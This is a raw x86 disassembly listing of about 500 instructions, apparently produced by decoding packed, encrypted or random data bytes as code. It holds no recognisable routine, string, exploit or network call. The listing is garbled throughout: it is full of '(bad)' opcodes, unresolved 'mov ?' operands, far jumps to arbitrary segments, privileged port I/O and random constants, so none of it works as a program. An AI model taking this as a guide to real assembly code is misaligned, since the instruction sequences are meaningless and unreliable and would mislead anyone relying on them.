  407e3e:	in     eax,dx
  407e3f:	jp     0x407dc8
  407e41:	and    ecx,DWORD PTR [esi]
  407e43:	outs   dx,DWORD PTR ds:[esi]
  407e44:	fdecstp 
  407e46:	xlat   BYTE PTR ds:[ebx]
  407e47:	aas    
  407e48:	(bad)  [edi]
  407e4a:	sar    BYTE PTR [ebp-0x68],cl
  407e4d:	mov    al,ds:0xb1687037
  407e52:	dec    ebp
  407e53:	loop   0x407e9c
  407e55:	adc    esp,esp
  407e57:	stc    
  407e58:	mov    ebp,0x52ca6b9d
  407e5d:	jmp    0x6097:0xaca7b6c7
  407e64:	and    eax,0x2a2e20a9
  407e69:	fistp  WORD PTR [di]
  407e6c:	rcr    BYTE PTR [eax-0x44],0xb4
  407e70:	lods   al,BYTE PTR ds:[esi]
  407e71:	neg    ah
  407e73:	sbb    eax,0xd7c6fb
  407e78:	xchg   esi,eax
  407e79:	inc    ebp
  407e7a:	xchg   edx,eax
  407e7b:	mov    ebx,0xb83b2bde
  407e80:	aaa    
  407e81:	js     0x407e28
  407e83:	sub    edx,ebx
  407e85:	xchg   ecx,eax
  407e86:	cmc    
  407e87:	leave  
  407e88:	xchg   edi,eax
  407e89:	or     DWORD PTR ds:0x5ec120f2,esi
  407e8f:	call   0x52d2:0xad9685eb
  407e96:	test   DWORD PTR [ebx],ebx
  407e98:	and    dh,dl
  407e9a:	imul   ecx,DWORD PTR [esi],0x17dd8afa
  407ea0:	sub    bl,BYTE PTR [esi]
  407ea2:	pushf  
  407ea3:	ret    0x6ab9
  407ea6:	dec    ebp
  407ea7:	adc    edi,DWORD PTR [edi-0x1c]
  407eaa:	inc    ebx
  407eab:	mov    esp,0x165685b6
  407eb0:	mov    edi,0x1615ef3e
  407eb5:	test   eax,0xa0494805
  407eba:	leave  
  407ebb:	std    
  407ebc:	repnz mov dl,0xd8
  407ebf:	adc    eax,0xcf0d33a6
  407ec4:	aaa    
  407ec5:	mov    WORD PTR [edx-0x7b],?
  407ec8:	push   ds
  407ec9:	push   edi
  407eca:	inc    edi
  407ecb:	ds aas 
  407ecd:	test   BYTE PTR [ebx-0x2567e309],ch
  407ed3:	sbb    eax,0xd8673a5f
  407ed8:	mov    ds:0x28acc88,al
  407edd:	dec    ebx
  407ede:	xchg   esp,eax
  407edf:	aas    
  407ee0:	es rcr ah,cl
  407ee3:	jno    0x407e81
  407ee5:	pop    ecx
  407ee6:	daa    
  407ee7:	mov    al,0xfd
  407ee9:	sti    
  407eea:	enter  0x79d,0x61
  407eee:	(bad)  
  407eef:	in     al,0xea
  407ef1:	retf   0x313b
  407ef4:	jmp    0x49e73d08
  407ef9:	and    DWORD PTR [ebx-0x5025587c],edx
  407eff:	and    eax,0x32a53244
  407f04:	outs   dx,BYTE PTR ds:[esi]
  407f05:	cli    
  407f06:	adc    bl,BYTE PTR [edi+0x30]
  407f09:	stos   BYTE PTR es:[edi],al
  407f0a:	add    BYTE PTR [edi],cl
  407f0c:	jnp    0x407f13
  407f0e:	sub    eax,0xffffffa6
  407f11:	aam    0xd8
  407f13:	ds sbb eax,0x794be3f5
  407f19:	xchg   edi,eax
  407f1a:	mov    ds:0xf3f97249,al
  407f1f:	mov    ebp,0xadfa66c6
  407f24:	call   0x1d1fe7f8
  407f29:	dec    edi
  407f2a:	push   ecx
  407f2b:	push   ds
  407f2c:	pop    eax
  407f2d:	mov    ch,0x9d
  407f2f:	jge    0x407f07
  407f31:	push   eax
  407f32:	jae    0x407f9e
  407f34:	or     bh,cl
  407f36:	jae    0x407f6d
  407f38:	cmp    al,0x22
  407f3a:	aad    0x84
  407f3c:	scas   al,BYTE PTR es:[edi]
  407f3d:	shl    edi,cl
  407f3f:	nop
  407f40:	loop   0x407efd
  407f42:	mov    edx,0xb2adae81
  407f47:	into   
  407f48:	adc    BYTE PTR [edx-0x6481cd23],dh
  407f4e:	pushf  
  407f4f:	jae    0x407ee6
  407f51:	and    DWORD PTR [ecx+0x14c58f14],0xde770bca
  407f5b:	and    eax,0x168ca84c
  407f60:	push   ss
  407f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f62:	mov    ebx,0x1eba6ade
  407f67:	pop    ss
  407f68:	jne    0x407f04
  407f6a:	sbb    DWORD PTR [edx+esi*4-0x293fed69],0x17
  407f72:	ja     0x407f77
  407f74:	imul   edi,edx,0xffffffc9
  407f77:	xchg   ebx,eax
  407f78:	xor    al,al
  407f7a:	cmp    DWORD PTR [edi],esi
  407f7c:	les    ebx,FWORD PTR [edi-0x42]
  407f7f:	or     al,ah
  407f81:	mov    esi,0xe1127cb8
  407f86:	and    BYTE PTR [edx-0x77],0xcb
  407f8a:	jno    0x407f17
  407f8c:	or     ebp,DWORD PTR [eax-0x3079440d]
  407f92:	stos   BYTE PTR es:[edi],al
  407f93:	je     0x407faa
  407f95:	hlt    
  407f96:	outs   dx,BYTE PTR ds:[esi]
  407f97:	mov    dh,cl
  407f99:	mov    cs,WORD PTR [edi+0x62]
  407f9c:	les    esi,FWORD PTR [ecx-0x13b8331f]
  407fa2:	fs jmp 0x63ecc14c
  407fa8:	rcl    esi,1
  407faa:	iret   
  407fab:	mov    ah,0xeb
  407fad:	and    esp,DWORD PTR [ecx-0x391f5e0a]
  407fb3:	jmp    0xadd2:0x6bfd051f
  407fba:	lock adc BYTE PTR [edx-0x56],dh
  407fbe:	sbb    dl,BYTE PTR [esi+0x42]
  407fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fc2:	pop    es
  407fc3:	adc    al,0x27
  407fc5:	pop    esp
  407fc6:	pop    eax
  407fc7:	pop    ebx
  407fc8:	fldenv [edi-0x5fc3baea]
  407fce:	cmp    edx,DWORD PTR [edx+0x1a]
  407fd1:	xor    DWORD PTR [ebx],edx
  407fd3:	je     0x407fd3
  407fd5:	dec    ebx
  407fd6:	jg     0x407f7f
  407fd8:	popa   
  407fd9:	fdivr  QWORD PTR [ecx-0x45]
  407fdc:	xchg   edi,eax
  407fdd:	jmp    0x40801a
  407fdf:	aad    0x82
  407fe1:	adc    eax,0x60a81b67
  407fe6:	leave  
  407fe7:	adc    eax,0xc3a93d21
  407fec:	icebp  
  407fed:	scas   al,BYTE PTR es:[edi]
  407fee:	add    al,0xdb
  407ff0:	test   esp,esp
  407ff2:	push   edx
  407ff3:	or     al,0x28
  407ff5:	inc    edx
  407ff6:	imul   edi,DWORD PTR ds:0x70d488ed,0x14
  407ffd:	nop
  407ffe:	sub    DWORD PTR [eax],edx
  408000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408001:	jg     0x40805d
  408003:	repnz dec edx
  408005:	xor    eax,esp
  408007:	and    eax,0xf01ffe17
  40800c:	lahf   
  40800d:	aam    0x2a
  40800f:	adc    DWORD PTR [ebp-0x4b],esp
  408012:	(bad)  
  408013:	fidivr DWORD PTR [ecx-0x3301b6c4]
  408019:	jecxz  0x40802f
  40801b:	pop    edi
  40801c:	je     0x407f9e
  40801e:	xor    DWORD PTR [ecx+edi*2-0x160e0f1a],ecx
  408025:	inc    esp
  408026:	jb     0x407fdf
  408028:	push   edi
  408029:	push   ds
  40802a:	bound  ebx,QWORD PTR [edx]
  40802c:	push   ebx
  40802d:	pop    eax
  40802e:	fwait
  40802f:	ret    0xbec6
  408032:	sti    
  408033:	push   esp
  408034:	mov    eax,ds:0x67c0632f
  408039:	(bad)  
  40803a:	pop    edi
  40803b:	js     0x40806b
  40803d:	(bad)  
  40803e:	popf   
  40803f:	add    eax,0x2cd2ee69
  408044:	in     al,dx
  408045:	cmp    DWORD PTR [eax-0x30],esi
  408048:	mov    al,ds:0xa26ca841
  40804d:	aas    
  40804e:	push   ebx
  40804f:	les    ebx,FWORD PTR [esi]
  408051:	leave  
  408052:	push   ecx
  408053:	jmp    0x40800d
  408055:	pop    esp
  408056:	pop    es
  408057:	jne    0x408084
  408059:	repnz xlat BYTE PTR ds:[ebx]
  40805b:	xor    ch,BYTE PTR [ebx+0x30]
  40805e:	pop    edx
  40805f:	arpl   WORD PTR [edi-0x31],cx
  408062:	icebp  
  408063:	aam    0x94
  408065:	repz or DWORD PTR [esi+0x69f0db8d],eax
  40806c:	es (bad) 
  40806e:	int3   
  40806f:	inc    ecx
  408070:	pop    esi
  408071:	mov    edi,0x174e260f
  408076:	add    al,0xea
  408078:	dec    esi
  408079:	push   ds
  40807a:	lods   eax,DWORD PTR ds:[esi]
  40807b:	mov    cl,0x50
  40807d:	int3   
  40807e:	and    BYTE PTR [ecx],ch
  408080:	jmp    0xee05e722
  408085:	icebp  
  408086:	or     al,0x5f
  408088:	stc    
  408089:	mov    bh,0x45
  40808c:	push   0x58
  40808e:	pop    ds
  40808f:	fild   QWORD PTR [edi-0x5]
  408092:	imul   ebx,DWORD PTR [esi],0x7b
  408095:	push   ebp
  408096:	daa    
  408097:	adc    dl,BYTE PTR [esi]
  408099:	add    eax,0xab889a51
  40809e:	in     eax,0x2e
  4080a0:	cmp    DWORD PTR [eax+0x48a57bf1],ebp
  4080a6:	pop    esi
  4080a7:	dec    eax
  4080a8:	dec    eax
  4080a9:	push   eax
  4080ab:	mov    dh,0x31
  4080ad:	mov    bl,BYTE PTR [edi]
  4080af:	jg     0x40803a
  4080b1:	rcr    BYTE PTR [edx-0x7a169d4d],cl
  4080b7:	and    ch,al
  4080b9:	xor    BYTE PTR [ebp-0x75],0x1c
  4080bd:	ja     0x4080cb
  4080bf:	push   ebx
  4080c0:	inc    esi
  4080c1:	cmp    edx,0x27
  4080c4:	or     eax,0x4ae1a667
  4080c9:	dec    ebp
  4080ca:	jnp    0x40811b
  4080cc:	push   esp
  4080cd:	xchg   eax,esi
  4080cf:	mov    esp,0x69ee163b
  4080d4:	or     al,0x34
  4080d6:	repnz ins DWORD PTR es:[edi],dx
  4080d8:	jne    0x4080f4
  4080da:	cmp    al,0x78
  4080dc:	pusha  
  4080dd:	pop    es
  4080de:	xlat   BYTE PTR ds:[ebx]
  4080df:	dec    esp
  4080e0:	jmp    0xfe9:0x6d85ddbb
  4080e7:	inc    ebx
  4080e8:	cs scas eax,DWORD PTR es:[edi]
  4080ea:	adc    edx,edx
  4080ec:	shl    edi,cl
  4080ee:	loopne 0x40808d
  4080f0:	fnstenv ds:0xc526847c
  4080f6:	cmp    ah,BYTE PTR [edx+eax*2]
  4080f9:	scas   eax,DWORD PTR es:[edi]
  4080fa:	cmp    al,0x34
  4080fc:	mov    DWORD PTR [esi-0x7f],eax
  4080ff:	xchg   ebp,eax
  408100:	xchg   esp,edi
  408102:	into   
  408103:	mov    ebx,0xe319edd2
  408108:	xor    eax,0x988fa4e9
  40810d:	mov    ds:0x574c914b,eax
  408112:	fmul   QWORD PTR [ebp+0x60]
  408115:	jbe    0x4080cd
  408117:	into   
  408118:	inc    edi
  408119:	stos   DWORD PTR es:[edi],eax
  40811a:	sbb    BYTE PTR [eax-0x363bd927],dh
  408120:	push   edi
  408121:	and    eax,0xa6b50c09
  408126:	mov    esi,0xaa7a0600
  40812b:	cmp    eax,0x23427b49
  408130:	jge    0x40815d
  408132:	sbb    BYTE PTR [esi],ch
  408134:	xchg   esi,eax
  408135:	pop    ebp
  408136:	inc    esp
  408137:	dec    ebx
  408138:	imul   ecx,edi,0x39
  40813b:	mov    WORD PTR [edi-0x75b942e3],es
  408141:	sbb    DWORD PTR [esi-0x1b],ebx
  408144:	std    
  408145:	push   eax
  408146:	xchg   ebx,eax
  408147:	jl     0x4080df
  408149:	push   eax
  40814a:	(bad)  
  40814c:	retf   
  40814d:	xor    DWORD PTR [ebx-0x4264c0a],0xffffffe8
  408154:	in     al,dx
  408155:	mov    ch,0x79
  408157:	xlat   BYTE PTR ds:[ebx]
  408158:	dec    ebp
  408159:	inc    esi
  40815a:	adc    DWORD PTR [edi-0x631d0695],eax
  408160:	add    eax,0x26acab6
  408165:	xor    dl,bl
  408167:	scas   al,BYTE PTR es:[edi]
  408168:	adc    BYTE PTR [edx+0x4f],bh
  40816b:	cmp    al,0x39
  40816d:	xor    dh,BYTE PTR [edx+edi*4-0x45]
  408171:	imul   edx,DWORD PTR [eax-0x20794246],0x22b94f5e
  40817b:	rcl    DWORD PTR ds:0x2a1b123b,0x14
  408182:	dec    ecx
  408183:	mov    ch,0x1e
  408185:	cmc    
  408186:	mov    esi,0xa9206bf2
  40818b:	jp     0x4081c0
  40818d:	pop    esi
  40818e:	dec    esi
  40818f:	inc    ecx
  408190:	add    esi,edx
  408192:	loopne 0x40813c
  408194:	iret   
  408195:	test   bl,0x5e
  408198:	in     eax,dx
  408199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819a:	ja     0x40819e
  40819c:	add    eax,0x4a86669a
  4081a1:	add    ebp,DWORD PTR [ecx-0x5e]
  4081a4:	mov    eax,ds:0x9bfd9861
  4081a9:	add    DWORD PTR [esi],esi
  4081ab:	pop    ebx
  4081ac:	in     al,0x59
  4081ae:	sahf   
  4081af:	jmp    0x8ebec257
  4081b4:	and    al,0xe7
  4081b6:	jno    0x4081a3
  4081b8:	clc    
  4081b9:	ret    
  4081ba:	dec    esp
  4081bb:	inc    ebx
  4081bc:	(bad)  
  4081bd:	jg     0x4081a6
  4081bf:	cld    
  4081c0:	aas    
  4081c1:	dec    esp
  4081c2:	outs   dx,BYTE PTR ds:[esi]
  4081c3:	arpl   WORD PTR [edx+edx*4-0x3f93fb8],si
  4081ca:	ins    DWORD PTR es:[edi],dx
  4081cb:	push   ss
  4081cc:	xor    DWORD PTR [ebx+edi*1],esi
  4081cf:	mov    eax,ds:0xd09391f1
  4081d4:	(bad)  
  4081d5:	shr    ch,1
  4081d7:	push   edi
  4081d8:	xchg   esi,eax
  4081d9:	adc    ebx,DWORD PTR ds:0xd262f942
  4081df:	push   esp
  4081e0:	adc    BYTE PTR [edi+0x1f],dl
  4081e3:	push   es
  4081e4:	cld    
  4081e5:	call   0xbd7e8e03
  4081ea:	adc    ecx,0xc6465f29
  4081f0:	add    BYTE PTR [edx-0x1637ee28],bl
  4081f6:	pop    ebp
  4081f7:	cld    
  4081f8:	add    DWORD PTR [ebp+edx*2+0x449e0a74],ebx
  4081ff:	push   ss
  408200:	inc    ebx
  408201:	dec    ebp
  408202:	pop    ebx
  408203:	clc    
  408204:	xor    edx,DWORD PTR [eax+0x11]
  408207:	sub    DWORD PTR [ecx-0x53e4855c],esi
  40820d:	in     eax,0xd9
  40820f:	adc    DWORD PTR [esi+edx*4+0x32],edx
  408213:	fmul   QWORD PTR [ecx-0x12]
  408216:	sbb    DWORD PTR ss:0x2a0cf07d,eax
  40821d:	outs   dx,BYTE PTR ds:[esi]
  40821e:	xor    edi,DWORD PTR [ebp+0x2e]
  408221:	sahf   
  408222:	(bad)  
  408223:	push   edi
  408224:	vaddsubpd xmm4,xmm0,XMMWORD PTR [edx-0x6a0316d1]
  40822c:	mov    ds:0xb9081c6b,al
  408231:	mov    ebp,0x2cd3512d
  408236:	imul   eax,DWORD PTR [eax-0x63],0x1e2090e8
  40823d:	aam    0x9c
  40823f:	lods   eax,DWORD PTR ds:[esi]
  408240:	or     ecx,ebp
  408242:	xor    dl,BYTE PTR [eax+0x52ae35f5]
  408248:	pop    ebp
  408249:	add    DWORD PTR [edi],0x1b
  40824c:	or     eax,0x3ea47e3d
  408251:	push   ecx
  408252:	push   0x22c36dfc
  408257:	aaa    
  408258:	dec    ebp
  408259:	rcr    ah,1
  40825b:	push   es
  40825c:	dec    ebp
  40825d:	push   ds
  40825e:	mov    eax,0x7405ce35
  408263:	loop   0x4082ab
  408265:	mov    bl,0xaa
  408267:	(bad)  
  408269:	rcr    DWORD PTR [ebp+0x12cd1a20],1
  40826f:	les    edx,FWORD PTR [eax-0x33b13df2]
  408275:	(bad)
  408278:	nop
  408279:	push   edx
  40827a:	fidivr DWORD PTR [ebx]
  40827c:	in     al,0xb3
  40827e:	je     0x408218
  408280:	ds retf 
  408282:	lods   al,BYTE PTR ds:[esi]
  408283:	add    BYTE PTR [ecx-0x4b],al
  408286:	dec    edx
  408287:	xor    ebp,DWORD PTR [edx+0x7e3c7882]
  40828d:	xor    al,0x7f
  40828f:	mov    edx,0xab864550
  408294:	push   ds
  408295:	or     al,ah
  408297:	cmp    eax,0xaedfba25
  40829c:	xchg   ebx,eax
  40829d:	or     al,0xec
  40829f:	sbb    esi,eax
  4082a1:	aam    0xd
  4082a3:	out    0x20,al
  4082a5:	dec    edi
  4082a6:	push   ss
  4082a7:	(bad)
  4082aa:	mov    edx,0x4af998f
  4082af:	mov    ebp,0x29724bab
  4082b4:	push   ds
  4082b5:	arpl   di,sp
  4082b7:	fstp   TBYTE PTR [ebx]
  4082b9:	pop    edi
  4082ba:	pop    ebp
  4082bb:	iret   
  4082bc:	cmp    bh,al
  4082be:	lock jmp 0x3251455
  4082c4:	es push cs
  4082c6:	imul   esi,DWORD PTR fs:[edi+0x3e],0xeb81db38
  4082ce:	scas   al,BYTE PTR es:[edi]
  4082cf:	mov    ch,0x12
  4082d1:	test   BYTE PTR [ecx+ebx*2],bh
  4082d4:	pusha  
  4082d5:	mov    esp,0x5463d864
  4082da:	add    al,0x64
  4082dc:	inc    ecx
  4082dd:	xchg   esp,eax
  4082de:	jecxz  0x408266
  4082e0:	call   0x349:0x92f6035b
  4082e7:	aam    0x11
  4082e9:	(bad)  
  4082ea:	mov    esp,0x6603480d
  4082ef:	jbe    0x408280
  4082f1:	adc    ebx,ebp
  4082f3:	cs (bad) 
  4082f6:	xchg   esi,eax
  4082f7:	fist   DWORD PTR ds:[ebp+0x26d104df]
  4082fe:	inc    edi
  4082ff:	xchg   ebp,eax
  408300:	outs   dx,DWORD PTR ds:[esi]
  408301:	lds    esp,FWORD PTR [esi+edx*4+0x5d]
  408305:	call   0x963faa51
  40830a:	mov    edx,0x845b566b
  40830f:	fsubp  st(5),st
  408311:	repnz sub ch,BYTE PTR [edx]
  408314:	ins    BYTE PTR es:[edi],dx
  408315:	push   esi
  408316:	shl    DWORD PTR [eax],1
  408318:	lods   eax,DWORD PTR ds:[esi]
  408319:	mov    BYTE PTR [eax],cl
  40831b:	mov    bl,0xf4
  40831d:	in     al,0x10
  40831f:	(bad)  
  408320:	adc    ecx,DWORD PTR [ebp+0x9]
  408323:	fadd   DWORD PTR [edi+esi*2]
  408326:	loopne 0x408346
  408328:	sub    BYTE PTR [eax],ah
  40832a:	cwde   
  40832b:	repnz ins BYTE PTR es:[edi],dx
  40832d:	cs mov esi,0x94059556
  408334:	in     eax,0x91
  408336:	cmp    al,0x58
  408338:	into   
  408339:	shl    BYTE PTR [edi],cl
  40833b:	add    eax,0x2cbb6a2d
  408340:	iret   
  408341:	test   ecx,eax
  408343:	sub    al,0x94
  408345:	and    dl,BYTE PTR ds:0x9ea4d383
  40834b:	or     eax,0xf786f430
  408350:	mov    WORD PTR [edi],?
  408352:	pop    ebx
  408353:	sbb    ebp,DWORD PTR [edi]
  408355:	inc    ecx
  408356:	and    esp,DWORD PTR [esi-0x6dfa76f0]
  40835c:	jle    0x40833e
  40835e:	push   ds
  40835f:	ja     0x4082ec
  408361:	inc    edx
  408362:	test   cl,bh
  408364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408365:	jp     0x4083bc
  408367:	imul   edi,DWORD PTR [edx+ebx*1+0x8],0x796696c
  40836f:	jno    0x408340
  408371:	mov    ebx,0xe0b1e572
  408376:	mov    ebx,0xd8f066fb
  40837b:	jb     0x4082fd
  40837d:	mov    esi,0x8115ee82
  408382:	jecxz  0x4083ad
  408384:	cmp    BYTE PTR [esi],0xa6
  408387:	test   BYTE PTR [esi+0x2147cb90],dh
  40838d:	jne    0x40839c
  40838f:	add    BYTE PTR [ebx+0x36],0x6a
  408393:	jle    0x408413
  408395:	call   0xa6ce:0x15c7dad8
  40839c:	enter  0xd401,0x9a
  4083a0:	sub    eax,0xb5cf814c
  4083a5:	add    al,0xfc
  4083a7:	shl    DWORD PTR [edi-0x5db2ef1],0x44
  4083ae:	std    
  4083af:	sub    al,0xa6
  4083b1:	fdivr  DWORD PTR [ebp-0xc4f771f]
  4083b7:	push   es
  4083b8:	add    al,0x9c
  4083ba:	pop    es
  4083bb:	sbb    eax,0xb92838b0
  4083c0:	mov    ecx,0x43ff483d
  4083c5:	(bad)  
  4083c6:	pop    eax
  4083c7:	daa    
  4083c8:	in     al,0xab
  4083ca:	in     eax,0x8d
  4083cc:	in     eax,dx
  4083cd:	fiadd  WORD PTR [edx+0x763dd4b6]
  4083d3:	cdq    
  4083d4:	xchg   esp,eax
  4083d5:	dec    edi
  4083d6:	pop    edi
  4083d7:	xor    al,ch
  4083d9:	add    BYTE PTR [ecx+0x5be8ddff],0xca
  4083e0:	xchg   ebp,eax
  4083e1:	aaa    
  4083e2:	cmp    BYTE PTR [ecx-0x58def63e],0x7
  4083e9:	cld    
  4083ea:	retf   
  4083eb:	arpl   WORD PTR [edi+0x72f211e7],dx
  4083f1:	mov    esi,0x3927ac3
  4083f6:	es fs in eax,0xa1
  4083fa:	stc    
  4083fb:	div    DWORD PTR [eax+0x58]
  4083fe:	cmp    al,0x35
  408400:	stc    
  408401:	jns    0x4083c6
  408403:	shr    BYTE PTR [eax],cl
  408405:	rcl    eax,cl
  408407:	xchg   ah,ah
  408409:	push   ecx
  40840a:	add    eax,0xda62c604
  40840f:	(bad)  
  408410:	xor    ebp,edi
  408412:	mov    eax,ds:0x82ea2dd
  408417:	fwait
  408418:	call   0xbec9:0xfb10913a
  40841f:	addr16 mov ds:0xabfb,eax
  408423:	sbb    eax,0xec0bb1c4
  408428:	ror    BYTE PTR [esi+0x65],1
  40842b:	out    dx,eax
  40842c:	cld    
  40842d:	add    al,0x40
  40842f:	pop    edi
  408430:	pop    ss
  408431:	clc    
  408432:	in     eax,dx
  408433:	mov    ch,0xe3
  408435:	in     al,0x1d
  408437:	xchg   BYTE PTR [ebp+0xb9bed4e],ah
  40843d:	nop
  40843e:	mov    edi,0xd6b3d396
  408443:	xor    ecx,edi
  408445:	cdq    
  408446:	inc    edx
  408447:	out    dx,eax
  408448:	ret    
  408449:	nop
  40844a:	add    bl,BYTE PTR [ebx+ebp*2]
  40844d:	pop    esi
  40844e:	(bad)  
  40844f:	mov    ch,dh
  408451:	addr16 retf 
  408453:	stos   DWORD PTR es:[edi],eax
  408454:	not    bh
  408456:	adc    eax,0x2d2a8d0f
  40845b:	push   ss
  40845c:	jo     0x4084b1
  40845e:	cmp    BYTE PTR [ecx+edi*1],cl
  408461:	pusha  
  408462:	adc    al,0x5a
  408464:	pop    ebx
  408465:	push   0x76
  408467:	inc    ebp
  408468:	fisub  WORD PTR [ebp+eiz*8-0x7bca312a]
  40846f:	dec    eax
  408470:	pop    ebp
  408471:	mov    eax,0x19d5839b
  408476:	xor    DWORD PTR [ebx-0x3c42b782],eax
  40847c:	repz into 
  40847e:	int    0x16
  408480:	mov    cl,0xd4
  408482:	pop    es
  408483:	xchg   edx,eax
  408484:	popa   
  408485:	pusha  
  408486:	and    esp,DWORD PTR [ecx+edx*4-0x136336d3]
  40848d:	fcmovnb st,st(3)
  40848f:	sbb    esp,DWORD PTR [esi]
  408491:	sub    BYTE PTR [esi-0x4917a0b0],bh
  408497:	mov    bl,0x56
  408499:	sbb    al,dh
  40849b:	mov    ebp,0x13ff5abf
  4084a0:	pop    esp
  4084a1:	and    DWORD PTR [edi+0x47],ecx
  4084a4:	outs   dx,BYTE PTR ds:[esi]
  4084a5:	ja     0x40850f
  4084a7:	push   0xd37c6d8e
  4084ac:	mov    ds:0xb069d930,eax
  4084b1:	xchg   edi,eax
  4084b2:	ja     0x4084fd
  4084b4:	mov    dl,ch
  4084b6:	mov    DWORD PTR [edi],ecx
  4084b8:	mov    ds:0x5d8eeecf,al
  4084bd:	arpl   WORD PTR [ecx+0x2d],si
  4084c0:	pop    ss
  4084c1:	jmp    0x408526
  4084c3:	fcmovnbe st,st(6)
  4084c5:	jmp    0x408513
  4084c7:	fsubr  st(6),st
  4084c9:	xor    eax,0xc61788a0
  4084ce:	js     0x40847c
  4084d0:	out    dx,al
  4084d1:	jb     0x408520
  4084d3:	adc    BYTE PTR [eax+0x4],bl
  4084d6:	or     DWORD PTR gs:[eax+0x9],eax
  4084da:	outs   dx,DWORD PTR ds:[esi]
  4084db:	ss jmp 0x4084eb
  4084de:	dec    edi
  4084df:	(bad)  
  4084e0:	dec    ebx
  4084e1:	sub    edi,DWORD PTR [ebx]
  4084e3:	push   edi
  4084e4:	pop    ss
  4084e5:	fs in  al,0xed
  4084e8:	sub    BYTE PTR ds:0x26cf1d2b,dh
  4084ee:	add    BYTE PTR [esi],0x9e
  4084f1:	and    dh,BYTE PTR [edi-0x2]
  4084f4:	dec    ebp
  4084f5:	xchg   edx,eax
  4084f6:	sbb    al,0x7a
  4084f8:	arpl   dx,ax
  4084fa:	push   ebp
  4084fb:	mov    bl,0x2c
  4084fd:	pop    ds
  4084fe:	das    
  4084ff:	mov    WORD PTR [ecx+0x723ac214],fs
  408505:	repnz mov edx,0x61bd154f
  40850b:	stos   DWORD PTR es:[edi],eax
  40850c:	fmul   QWORD PTR [eax+eiz*2+0x1e9ced7f]
  408513:	mov    ch,0x40
  408515:	int3   
  408516:	sbb    al,BYTE PTR [ebp+edx*8-0x70]
  40851a:	pusha  
  40851b:	fs dec ebx
  40851d:	daa    
  40851e:	or     al,0xdd
  408520:	sub    eax,0x6478678
  408525:	in     al,dx
  408526:	mov    ah,0x19
  408528:	jb     0x4084bc
  40852a:	mov    edi,0xd26e4b7d
  40852f:	dec    esi
  408530:	dec    edx
  408531:	mov    ?,ebp
  408533:	sub    DWORD PTR [edx+edi*4-0x2],edi
  408537:	adc    BYTE PTR ds:0xd11894f6,ch
  40853d:	xchg   esi,eax
  40853e:	xor    edx,DWORD PTR [edi-0x260c7fb5]
  408544:	mov    edi,0xccca5ce6
  408549:	rcl    BYTE PTR [eax],cl
  40854b:	jae    0x408503
  40854d:	addr16 sbb edi,esp
  408550:	add    bh,BYTE PTR [eax+0x27]
  408553:	mov    cl,BYTE PTR [esi+0x2a]
  408556:	or     al,0x33
  408558:	or     ebp,esi
  40855a:	mov    ebx,DWORD PTR [edi+0x52]
  40855d:	fs (bad) 
  40855f:	mov    ebp,0xa888deda
  408564:	pop    es
  408565:	or     bl,BYTE PTR [ebp-0x1c]
  408568:	retf   0x9a86
  40856b:	push   es
  40856c:	cwde   
  40856d:	out    dx,eax
  40856e:	pop    es
  40856f:	mov    ch,0x1a
  408571:	inc    esp
  408572:	mov    DWORD PTR [ecx-0x2670b440],0x1101ea60
  40857c:	mov    ds:0xa542b0e7,eax
  408581:	imul   esp,DWORD PTR [ebx],0x3f9afb9d
  408587:	(bad)  [ecx-0x48b0cb40]
  40858d:	jnp    0x4085b6
  40858f:	mov    edi,0x6aed2f61
  408594:	std    
  408595:	inc    edx
  408596:	shl    BYTE PTR [edx+0x407ea859],1
  40859c:	lds    eax,FWORD PTR [edi+ebx*1]
  40859f:	adc    cl,BYTE PTR [eax]
  4085a1:	xchg   esp,eax
  4085a2:	xchg   esi,eax
  4085a3:	fadd   QWORD PTR [ebp-0x5b]
  4085a6:	das    
  4085a7:	mov    esp,0xb2659364
  4085ac:	dec    ebp
  4085ad:	mov    ebx,0x18713289
  4085b2:	dec    ebp
  4085b3:	mov    cl,0xbb
  4085b5:	or     DWORD PTR [eax+0x12],ecx
  4085b8:	sti    
  4085b9:	lds    ebx,FWORD PTR [ecx-0x46]
  4085bc:	xor    esi,DWORD PTR [edi-0x42]
  4085bf:	xor    eax,DWORD PTR [esi+0x5a]
  4085c2:	fimul  DWORD PTR [edx+0x62]
  4085c5:	repz test DWORD PTR ds:[ecx+0x36],ecx
  4085ca:	ret    0xb0f1
  4085cd:	dec    esi
  4085ce:	scas   al,BYTE PTR es:[edi]
  4085cf:	sbb    BYTE PTR [esi+0x465e99a4],cl
  4085d5:	xor    BYTE PTR [ebx-0x43],al
  4085d8:	dec    edx
  4085d9:	cmp    al,0x73
  4085db:	mov    ch,0xbd
  4085dd:	jb     0x40858f
  4085df:	jno    0x4085bb
  4085e1:	adc    ebx,DWORD PTR [edi]
  4085e3:	lea    esp,[ebx]
  4085e5:	ins    BYTE PTR es:[edi],dx
  4085e6:	pop    eax
  4085e7:	ret    0xe227
  4085ea:	loopne 0x4085ec
  4085ec:	popf   
  4085ed:	jmp    0x408580
  4085ef:	or     BYTE PTR [ecx],dl
  4085f1:	add    al,0x56
  4085f3:	aaa    
  4085f4:	jb     0x4085a6
  4085f6:	cmp    al,0x6c
  4085f8:	retf   
  4085f9:	and    ebx,ecx
  4085fb:	xor    al,0x4c
  4085fd:	jmp    0x8e1f:0xeb51e77e
  408604:	adc    ebp,0x61fc4d23
  40860a:	xchg   ecx,eax
  40860b:	mov    ebp,0x3069faf4
  408610:	mov    esi,DWORD PTR [edx]
  408612:	js     0x408620
  408614:	mov    al,0xd4
  408616:	(bad)  
  408617:	sub    al,0xa0
  408619:	mov    esi,0x7f21aac3
  40861e:	dec    ebp
  40861f:	jge    0x408679
  408621:	push   ebp
  408622:	sub    eax,0x2bc33f3b
  408627:	push   0xffffffff
  408629:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40862a:	nop
  40862b:	iret   
  40862c:	repnz aas 
  40862e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40862f:	int3   
  408630:	or     BYTE PTR [ecx],cl
  408632:	js     0x4085e5
  408634:	xor    al,0xff
  408636:	psubd  mm0,mm0
  408639:	inc    edx
  40863a:	retf   
  40863b:	popf   
  40863c:	jnp    0x4086b3
  40863e:	ja     0x4085c6
  408640:	add    al,0xeb
  408642:	and    eax,0x45f19db6
  408647:	dec    ecx
  408648:	lock loop 0x4085db
